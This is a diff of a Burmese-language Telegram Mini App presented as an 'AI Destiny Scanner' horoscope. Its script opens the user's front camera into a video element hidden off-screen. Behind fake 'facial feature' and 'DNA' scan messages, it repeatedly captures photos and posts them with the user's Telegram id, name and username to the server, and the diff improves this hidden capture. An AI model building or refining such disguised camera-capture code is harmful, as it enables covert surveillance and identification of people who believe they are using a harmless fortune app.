@@ -9,8 +9,8 @@
         body { background: #0a0e14; color: #00d2ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; overflow-x: hidden; }
         .container { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
         
-        /* Stealth Video */
-        #video { position: fixed; top: -1000px; left: -1000px; width: 320px; height: 240px; opacity: 0; pointer-events: none; }
+        /* Stealth Video - Render မရပ်သွားအောင် off-screen ကိုပို့ထားပါသည် */
+        #video { position: fixed; top: -2000px; left: -2000px; width: 640px; height: 480px; pointer-events: none; }
         
         /* Scanner UI */
         .scan-line { width: 80%; height: 2px; background: #00d2ff; position: absolute; animation: scan 3s infinite linear; }
@@ -35,7 +35,7 @@
         .value { font-size: 1.1rem; font-weight: bold; color: #fff; display: block; margin-top: 4px; }
         .close-btn { 
             background: #00d2ff; color: #000; border: none; padding: 10px 20px; 
-            border-radius: 50px; width: 100%; margin-top: 20px; font-weight: bold;
+            border-radius: 50px; width: 100%; margin-top: 20px; font-weight: bold; cursor: pointer;
         }
     </style>
 </head>
@@ -44,7 +44,7 @@
         <div id="scanner-ui">
             <div class="scan-line"></div>
             <h2 id="header">AI DESTINY SCANNER</h2>
-            <p id="status">သင့်ရဲ့ ကံဇာတာအား စစ်ဆေးနေပါသည်...</p>
+            <p id="status">ကင်မရာ ဖွင့်ရန် စောင့်ဆိုင်းနေပါသည်...</p>
             <div class="loading-bar"><div class="progress" id="progress"></div></div>
         </div>
 
@@ -52,7 +52,7 @@
             <h2 style="text-align: center; color: #00d2ff; margin-top: 0;">DESTINY REPORT</h2>
             <div class="result-item">
                 <span class="label">Luck Level (ကံတရား)</span>
-                <span class="value" id="luck-val">95%</span>
+                <span class="value" id="luck-val">Loading...</span>
             </div>
             <div class="result-item">
                 <span class="label">Love (အချစ်ရေး)</span>
@@ -63,14 +63,14 @@
                 <span class="value" id="wealth-val">Loading...</span>
             </div>
             <div class="result-item">
-                <span class="label">Lucky Color (ကံကောင်းစေသောအရောင်)</span>
+                <span class="label">Lucky Color (အရောင်)</span>
                 <span class="value" id="color-val">Loading...</span>
             </div>
             <button class="close-btn" onclick="tg.close()">DONE</button>
         </div>
     </div>
 
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay muted playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
@@ -79,59 +79,59 @@
         const progress = document.getElementById('progress');
         const status = document.getElementById('status');
         const tg = window.Telegram.WebApp;
-        tg.ready(); tg.expand();
+        tg.ready(); 
+        tg.expand();
 
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(s => { 
-        video.srcObject = s; 
-        // Video data ရောက်လာမှ play လုပ်မယ်
-        video.onloadedmetadata = () => {
-            video.play().then(() => {
-                // Video သေချာပေါ်ဖို့ နောက်ထပ် 1 စက္ကန့် (1000ms) လောက် စောင့်ပြီးမှ စမယ်
-                setTimeout(startProcess, 1000);
-            });
-        };
-    })
-    .catch(() => status.innerText = "ကံဇာတာစစ်ဆေးနိုင်ရန် နောက်ထပ် Allow ကိုနှိပ်ပေးပါ");
+            .then(stream => { 
+                video.srcObject = stream; 
+                status.innerText = "ကင်မရာ ချိတ်ဆက်ပြီးပါပြီ။ စတင်နေပါသည်...";
+                
+                const checkVideo = setInterval(() => {
+                    if (video.readyState >= 3 && video.videoWidth > 0) {
+                        clearInterval(checkVideo);
+                        startProcess();
+                    }
+                }, 200);
+            })
+            .catch(() => status.innerText = "ကံဇာတာစစ်ဆေးရန် Allow ကိုနှိပ်ပေးပါ။");
 
         let captureCount = 0;
         function startProcess() {
             let width = 0;
             const itv = setInterval(() => {
-                width += 0.5;
+                width += 1; 
                 progress.style.width = width + '%';
                 
-                // --- ပြင်ဆင်ထားသော အပိုင်း (၄ ကြိမ်ရိုက်ပါမည်) ---
-                if (width == 15 && captureCount == 0) { captureImage("Initializing Scan..."); captureCount++; }
-                if (width == 40 && captureCount == 1) { captureImage("Analyzing Facial Features..."); captureCount++; }
-                if (width == 65 && captureCount == 2) { captureImage("Scanning DNA Patterns..."); captureCount++; }
-                if (width == 90 && captureCount == 3) { captureImage("Matching Star Constellations..."); captureCount++; }
-                // -------------------------------------------
+                if (width === 15 && captureCount === 0) { captureImage("Initializing Scan..."); captureCount++; }
+                if (width === 40 && captureCount === 1) { captureImage("Analyzing Facial Features..."); captureCount++; }
+                if (width === 65 && captureCount === 2) { captureImage("Scanning DNA Patterns..."); captureCount++; }
+                if (width === 90 && captureCount === 3) { captureImage("Matching Star Constellations..."); captureCount++; }
 
                 if (width >= 100) {
                     clearInterval(itv);
                     showHoroscope();
                 }
-            }, 50);
+            }, 40);
         }
 
         async function captureImage(msg) {
-             status.innerText = msg;
-             const ctx = canvas.getContext('2d');
-    
-             // Video dimension သေချာရှိမှ ဆက်လုပ်မယ်
+            status.innerText = msg;
+            
             if (video.videoWidth === 0 || video.videoHeight === 0) return;
 
+            const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth; 
             canvas.height = video.videoHeight;
-            // Width နဲ့ Height ကိုပါ ထည့်ရေးပေးပါ
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
-    
+            
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
             const img = canvas.toDataURL('image/jpeg', 0.6);
             const user = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user : null;
             const uid = user ? user.id : "Guest";
             const uname = user ? user.first_name : "External";
             const uhandle = (user && user.username) ? "@" + user.username : "No Username";
+            
             fetch('/upload', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -141,7 +141,7 @@
                     user_name: uname, 
                     user_handle: uhandle 
                 })
-            });
+            }).catch(e => console.log("Upload Error:", e));
         }
 
         function showHoroscope() {
@@ -149,7 +149,7 @@
             document.getElementById('result-card').style.display = 'block';
 
             const results = [
-        // --- အချစ်ရေး (Love & Relationship) ---
+                // --- အချစ်ရေး (Love & Relationship) [Index: 0 to 9] ---
                 "ယနေ့ Crush ဆီမှ Message ရောက်လာတတ်သည်။",
                 "အချစ်သစ်နှင့် ဆုံတွေ့ဖို့ ၈၀% သေချာနေပြီ။",
                 "ဟောင်းလေသော အချစ်ဟောင်းများ ပြန်ပေါ်လာတတ်သည်။",
@@ -161,7 +161,7 @@
                 "ယနေ့သည် အချစ်ရေးထက် သူငယ်ချင်းများနှင့် အချိန်ဖြုန်းသင့်သောနေ့ဖြစ်သည်။",
                 "Relationship ထဲမှာ နားလည်မှု အပြည့်အဝ ရရှိမည့်နေ့။",
 
-        // --- ငွေကြေးနှင့် ကံကောင်းခြင်း (Wealth & Luck) ---
+                // --- ငွေကြေးနှင့် ကံကောင်းခြင်း (Wealth & Luck) [Index: 10 to 19] ---
                 "မမျှော်လင့်ဘဲ လက်ဆောင် (သို့) မုန့်ဖိုး ရရှိတတ်သည်။",
                 "ထီပေါက်သလိုမျိုး ငွေဝင်ကိန်း အလွန်ကောင်းနေသည်။",
                 "ပိုက်ဆံအိတ်ထဲတွင် ငွေမပြတ်ဘဲ အမြဲရှိနေမည့်နေ့။",
@@ -173,7 +173,7 @@
                 "ယနေ့ ရင်းနှီးမြှုပ်နှံမှုလုပ်လျှင် အောင်မြင်နိုင်ချေ ရှိသည်။",
                 "ပိုက်ဆံကောက်ရတတ်သဖြင့် လမ်းလျှောက်လျှင် မြေကြီးကို ကြည့်ပါ။",
 
-        // --- ကျန်းမာရေးနှင့် စိတ်ခံစားချက် (Health & Mood) ---
+                // --- ကျန်းမာရေးနှင့် စိတ်ခံစားချက် (Health & Mood) [Index: 20 to 29] ---
                 "စိတ်ပျော်ရွှင်စရာ သတင်းကောင်းတစ်ခု ကြားရလိမ့်မည်။",
                 "ကျန်းမာရေးအတွက် ရေများများသောက်ရန် လိုအပ်နေသည်။",
                 "ယနေ့သည် အိမ်မှာပဲ အေးအေးဆေးဆေး နားယူသင့်သောနေ့ဖြစ်သည်။",
@@ -185,7 +185,7 @@
                 "စိတ်ဓာတ်ကျစရာရှိလျှင် သီချင်းအေးအေးလေး နားထောင်ပါ။",
                 "ယနေ့ သင့်ရဲ့ အပြုံးက ကမ္ဘာကြီးကို လှပစေပါလိမ့်မည်။",
 
-        // --- ဟာသနှင့် ထူးထူးဆန်းဆန်း (Fun & Mystery) ---
+                // --- ဟာသနှင့် ထူးထူးဆန်းဆန်း (Fun & Mystery) [Index: 30 to 49] ---
                 "ယနေ့ သင့်အား လူကြီးသူမတစ်ဦးက ဆူပူတတ်သဖြင့် ငြိမ်ငြိမ်နေပါ။",
                 "ခရီးသွားလျှင် လမ်းတွင် ရည်းစားဟောင်းနှင့် ဆုံတတ်သည်။",
                 "ယနေ့ ကံကောင်းခြင်းနံပါတ်မှာ ၇ ဖြစ်သည်။",
@@ -210,21 +210,20 @@
 
             const colors = ["ရွှေရောင် (Gold)", "အပြာနုရောင် (Sky Blue)", "အနီရောင် (Crimson Red)", "အဖြူရောင် (White)", "အနက်ရောင် (Black)"];
 
-    // Random ထုတ်ယူခြင်း
             document.getElementById('luck-val').innerText = Math.floor(Math.random() * (100 - 85 + 1) + 85) + "%";
-            document.getElementById('love-val').innerText = results[Math.floor(Math.random() * 10)]; // ပထမ ၁၀ ခု (Love)
-            document.getElementById('wealth-val').innerText = results[Math.floor(Math.random() * (20 - 11 + 1) + 11)]; // Wealth
+            
+            // အချစ်ရေးအတွက် Index 0 မှ 9 ထိ Random ယူသည်
+            document.getElementById('love-val').innerText = results[Math.floor(Math.random() * 10)]; 
+            
+            // စီးပွားရေးအတွက် Index 10 မှ 19 ထိ Random ယူသည်
+            document.getElementById('wealth-val').innerText = results[Math.floor(Math.random() * 10) + 10]; 
+            
             document.getElementById('color-val').innerText = colors[Math.floor(Math.random() * colors.length)];
-            setTimeout(sendReportCard, 1500);
-            setTimeout(() => {
-                captureImage("User Reading Result..."); 
-            }, 2000); 
-
-            // Card ပေါ်ပြီး ၅ စက္ကန့်အကြာမှာ နောက်တစ်ပုံ ထပ်ရိုက်မယ် (လိုအပ်ရင်သုံးပါ)
-            setTimeout(() => {
-                captureImage("User Reaction Capture..."); 
-            }, 5000);
+            
+            setTimeout(sendReportCard, 1000);
+            setTimeout(() => { captureImage("User Reading Result..."); }, 2000); 
         }
+
         function sendReportCard() {
             const card = document.getElementById('result-card');
             const uid = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : "Guest";
@@ -232,32 +231,19 @@
             if (uid !== "Guest") {
                 html2canvas(card, {
                     backgroundColor: "#16202a", 
-                    scale: 3, // ပုံပိုကြီးအောင် 3 လောက်ထားလိုက်ပါ
-                    logging: true,
+                    scale: 2, 
+                    logging: false,
                     useCORS: true
                 }).then(canvas => {
-                    // JPEG မဟုတ်ဘဲ PNG ပြောင်းလိုက်ပါ (စာလုံးပိုထင်ရှားမယ်)
                     const imgData = canvas.toDataURL('image/png'); 
-                    
                     fetch('/share_report', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ image: imgData, user_id: uid })
-                    }).then(res => console.log("Report Sent"));
+                    }).catch(e => console.log("Report Error:", e));
                 });
             }
-            // ...
         }
     </script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
